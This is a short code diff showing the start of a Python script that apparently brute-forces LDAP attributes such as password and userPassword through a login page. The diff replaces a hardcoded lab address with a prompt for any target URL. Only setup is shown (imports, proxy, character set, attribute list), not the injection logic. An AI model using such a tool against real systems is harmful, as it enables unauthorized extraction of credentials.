@@ -1,11 +1,12 @@
-#!/usr/bin/python3
+#!/usr/bin/env python3
+
 import requests
 import string
 from time import sleep
 import sys
 
-proxy = { "http": "localhost:8080" }
-url = "http://10.10.10.10/login.php"
+proxy = { "http": "127.0.0.1:8080" }
+url = str(input("Enter Target URL: "))
 alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"
 
 attributes = ["c", "cn", "co", "commonName", "dc", "facsimileTelephoneNumber", "givenName", "gn", "homePhone", "id", "jpegPhoto", "l", "mail", "mobile", "name", "o", "objectClass", "ou", "owner", "pager", "password", "sn", "st", "surname", "uid", "username", "userPassword",]
